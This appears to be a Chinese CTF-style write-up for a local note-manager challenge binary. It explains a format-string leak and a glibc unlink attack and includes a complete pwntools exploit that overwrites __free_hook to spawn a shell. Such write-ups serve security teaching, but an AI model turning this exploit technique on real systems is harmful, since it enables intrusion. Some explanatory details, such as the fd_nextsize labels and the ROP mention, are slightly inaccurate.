# 漏洞利用文档

## 执行环境

基于调试会话中的信息，程序运行环境分析如下：

- **二进制类型**：64位ELF可执行文件，使用动态链接和位置无关代码（PIE）
- **安全防护机制**（通过checksec确认）：
  - Full RELRO：全局重定位表只读，防止GOT覆盖
  - Stack Canary：栈保护启用，防止栈溢出
  - NX enabled：数据段不可执行，防止shellcode执行
  - PIE enabled：地址空间随机化，增加利用难度
- **依赖库**：依赖标准libc库（通过ldd确认），libc版本根据调试会话为glibc
- **运行要求**：需要标准Linux环境，程序通过终端交互，管理最多11个笔记

## 漏洞成因

### 关键结构体分析
程序使用全局数组管理笔记：
```c
struct note_entry {
    void *content_ptr;    // 指向堆分配的笔记内容
    unsigned int size;    // 笔记大小
} note[11];              // 最多11个笔记

unsigned int counts;     // 当前笔记计数
int key;                 // 全局密钥变量（初始为0）
```

### 主要漏洞：格式化字符串漏洞
**位置**：`banner()`函数
```c
printf("Enter your name: ");
__isoc99_scanf("%s", format);  // 用户输入直接读入栈上format[12]数组
printf("Hello, ");
printf(format);                // 直接使用用户输入作为格式字符串参数
```
**漏洞原因**：
- 使用`scanf("%s", format)`无长度限制读取用户输入到栈上缓冲区
- 直接调用`printf(format)`，将用户输入作为格式字符串
- 攻击者可输入`%p`泄露栈内存或`%n`进行内存写操作

### 次要漏洞：堆管理逻辑缺陷
在`add_note()`函数中：
```c
if (key == 43) {
    // 可分配任意大小内存（但key初始为0，此路径不可达）
} else {
    if (size <= 0x80) {
        puts("You can't hack me!");
        return;  // 直接返回但可能留下不一致状态
    }
    // 分配大内存
}
```
**利用潜力**：结合格式化字符串漏洞可修改key值，但exp中未利用此路径。

### 漏洞组合利用
格式化字符串漏洞用于信息泄露，结合堆操作实现任意地址写，最终劫持控制流。

## 漏洞利用过程

### 利用步骤与内存变化

| 步骤 | 操作描述 | 关键内存变化 | 利用目的 |
|------|----------|--------------|----------|
| **Step 1** | 利用格式化字符串漏洞泄露地址 | 泄露`__libc_start_main+240`地址和栈地址 | 计算libc基址和数据段指针 |
| **Step 2** | 计算关键指针 | `ptr = leak1 - 0x116a + 0x202060` | 获取全局note数组地址 |
| **Step 3** | 添加两个笔记（索引0和1） | 堆初始化，分配两个chunk：<br>• Chunk0: size=0x98, content='a'*8<br>• Chunk1: size=0x90, content='b'*8 | 创建堆布局，为unlink攻击准备 |
| **Step 4** | 编辑笔记0构造伪造chunk | Chunk0被修改为：<br>• size: 0x91 (PREV_INUSE set)<br>• fd_nextsize: ptr-0x18 (指向key+8)<br>• bk_nextsize: ptr-0x10 (指向key+16) | 构造unlink攻击的伪造free chunk |
| **Step 5** | 删除笔记1 | note[1]被清空，counts=1<br>Chunk1被free，触发unlink操作 | 通过unlink修改全局note[0].content_ptr |
| **Step 6** | 编辑笔记0设置hook和字符串 | note[0].content_ptr指向`__free_hook`<br>数据段写入`/bin/sh`字符串 | 准备system调用参数和劫持点 |
| **Step 7** | 编辑笔记0写入system地址 | `__free_hook`被覆盖为system函数地址 | 完成函数指针劫持 |
| **Step 8** | 删除笔记1触发利用 | 调用free(note[1].content_ptr)<br>实际执行system("/bin/sh") | 获得shell权限 |
| **Step 9** | 进入交互模式 | 程序切换到`/bin/dash`进程 | 完全控制系统 |

### 堆布局演变
1. **初始状态**：无堆段，全局变量未初始化
2. **分配后**：两个相邻chunk，Chunk0被构造为伪造free chunk
3. **攻击触发**：free Chunk1时，unlink操作修改全局变量
4. **最终状态**：`__free_hook`被劫持，成功获得shell

### 绕过防护机制
- **PIE**：通过格式化字符串泄露代码地址计算基址
- **RELRO**：不覆盖GOT，而是劫持`__free_hook`
- **Stack Canary**：不涉及栈溢出，canary保持完整
- **NX**：使用ROP链或直接劫持函数指针，不执行shellcode

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample12')
elf = ELF('./data/sample12')
libc = elf.libc

def add(idx, size, content):
    p.sendlineafter(b'>> ', b'1')
    p.recvuntil(b'(0-10):')
    p.sendline(str(idx))
    p.recvuntil(b'Enter a size:\n')
    p.sendline(str(size))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def edit(idx, content):
    p.sendlineafter(b'>> ', b'4')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def delete(idx):
    p.sendlineafter(b'>> ', b'2')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx).encode())

# Step 1: 利用格式化字符串漏洞泄露libc地址和栈地址
p.recvuntil(b'Enter your name: ')
p.sendline(b'%15$p%19$p')  # 使用格式化字符串泄露栈上第15和19个参数
p.recvuntil(b'Hello, ')
leak = int(p.recv(14), 16) - 240  # 泄露__libc_start_main+240地址
base = leak - libc.symbols["__libc_start_main"]  # 计算libc基址
libc.address = base
sys = libc.symbols["system"]  # 获取system函数地址
free_hook = libc.symbols["__free_hook"]  # 获取__free_hook地址

# Step 2: 泄露数据段指针并计算全局note数组地址
leak1 = int(p.recv(15), 16)
ptr = leak1 - 0x116a + 0x202060  # 计算全局变量区域地址

# Step 3: 分配两个chunk，创建堆布局
add(0, 0x98, 'a'*8)  # 分配chunk0，size=0x98
add(1, 0x90, 'b'*8)  # 分配chunk1，size=0x90

# Step 4: 构造unlink攻击的payload
# 伪造一个free chunk结构，设置fd/bk指针指向全局变量区域
payload = p64(0) + p64(0x91) + p64(ptr - 0x18) + p64(ptr - 0x10) + p64(0)*14 + p64(0x90) + b"\xa0"
edit(0, payload)  # 修改chunk0内容为伪造的chunk结构

# Step 5: 触发unlink攻击，修改全局note[0].content_ptr
delete(1)  # free chunk1时触发unlink，修改全局变量

# Step 6: 设置__free_hook和/bin/sh字符串
payload = p64(0)*3 + p64(free_hook) + p64(0x48) + p64(ptr + 0x18) + b'/bin/sh\x00'
edit(0, payload)  # 修改note[0]指向__free_hook，并在数据段写入/bin/sh

# Step 7: 将__free_hook覆盖为system函数地址
payload = p64(sys)
edit(0, payload)  # 写入system地址到__free_hook

# Step 8: 触发system("/bin/sh")执行
delete(1)  # free操作实际调用system("/bin/sh")

# Step 9: 获得shell交互
p.interactive()
```

### 关键注释说明
- **格式化字符串利用**：`%15$p%19$p`泄露栈上特定位置的指针，用于计算基址
- **unlink攻击**：通过伪造chunk结构，利用glibc的unlink操作修改全局变量
- **hook劫持**：覆盖`__free_hook`为system，将free调用转为system调用
- **参数准备**：在数据段放置`/bin/sh`字符串作为system的参数

此exp成功组合利用格式化字符串漏洞和堆漏洞，在完整防护环境下获得shell权限。
